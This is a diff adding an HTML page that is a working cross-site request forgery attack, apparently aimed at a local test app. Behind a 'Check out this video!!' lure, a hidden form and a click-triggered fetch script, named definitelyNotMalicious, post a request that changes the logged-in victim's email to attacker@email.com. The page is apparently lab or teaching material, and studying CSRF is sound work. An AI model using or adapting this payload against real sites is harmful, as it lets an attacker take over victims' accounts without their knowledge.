@@ -1,0 +1,21 @@
+<a href="http://yt.com" target="_blank" id="link"> Check out this video!! </a>
+<form action="/user/update" method="post">
+    <input type="text" name="name" id="update-name" value="user001" style="display: none;"><br>
+    <input type="text" name="user" id="update-uname" value="user001" style="display: none;"><br>
+    <input type="text" name="email" id="update-email" value="attacker@email.com" style="display: none;"><br>
+    <button type="submit" id="signup-button">Check out this video!!</button>
+</form>
+<script>
+    async function definitelyNotMalicious(){
+        data = {"email": "attacker@email.com"}
+        url = "http://127.0.0.1:5000/user/update"
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data) // body data type must match "Content-Type" header
+        });
+    }
+    document.getElementById("link").addEventListener("click", definitelyNotMalicious); 
+</script>
